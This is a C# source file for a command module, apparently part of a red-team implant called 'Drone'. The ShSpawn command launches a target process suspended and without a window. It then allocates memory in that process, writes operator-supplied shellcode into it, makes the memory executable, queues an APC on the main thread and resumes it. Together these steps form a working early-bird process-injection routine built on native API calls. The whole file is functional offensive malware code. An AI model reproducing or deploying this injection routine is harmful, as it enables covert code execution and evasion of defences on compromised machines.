using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

using DInvoke.Data;

namespace Drone.Commands;

using static Interop.Methods;
using static Interop.Data;

public sealed class ShSpawn : DroneCommand
{
    public override byte Command => 0x4B;
    public override bool Threaded => false;
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var spawnTo = task.Arguments["spawnto"];

        var pa = new SECURITY_ATTRIBUTES();
        var ta = new SECURITY_ATTRIBUTES();
        
        var si = new STARTUPINFOW();
        si.cb = (uint)Marshal.SizeOf(si);
        si.dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW;

        var success = CreateProcess(
            spawnTo,
            null,
            ref pa,
            ref ta,
            false,
            PROCESS_CREATION_FLAGS.CREATE_SUSPENDED | PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW,
            IntPtr.Zero,
            Directory.GetCurrentDirectory(),
            si,
            out var pi);

        if (!success)
            throw new Win32Exception(Marshal.GetLastWin32Error());

        // allocate memory
        var baseAddress = IntPtr.Zero;
        var status = NtAllocateVirtualMemory(
            pi.hProcess,
            task.Artefact.Length,
            MEMORY_ALLOCATION.MEM_COMMIT,
            MEMORY_PROTECTION.PAGE_READWRITE,
            ref baseAddress);

        if (status != Native.NTSTATUS.Success)
        {
            TerminateProcess(pi.hProcess, 0);
            await Drone.SendTaskError(task.Id, $"{status}");
            return;
        }
        
        // write shellcode
        status = NtWriteVirtualMemory(
            pi.hProcess,
            baseAddress,
            task.Artefact);
        
        if (status != Native.NTSTATUS.Success)
        {
            TerminateProcess(pi.hProcess, 0);
            await Drone.SendTaskError(task.Id, $"{status}");
            return;
        }
        
        // flip memory
        status = NtProtectVirtualMemory(
            pi.hProcess,
            baseAddress,
            task.Artefact.Length,
            MEMORY_PROTECTION.PAGE_EXECUTE_READ,
            out _);
        
        if (status != Native.NTSTATUS.Success)
        {
            TerminateProcess(pi.hProcess, 0);
            await Drone.SendTaskError(task.Id, $"{status}");
            return;
        }
        
        // queue apc
        var result = QueueUserApc(baseAddress, pi.hThread);

        if (result == 0)
        {
            TerminateProcess(pi.hProcess, 0);
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }
        
        // resume
        ResumeThread(pi.hThread);

        await Drone.SendTaskComplete(task.Id);
    }
}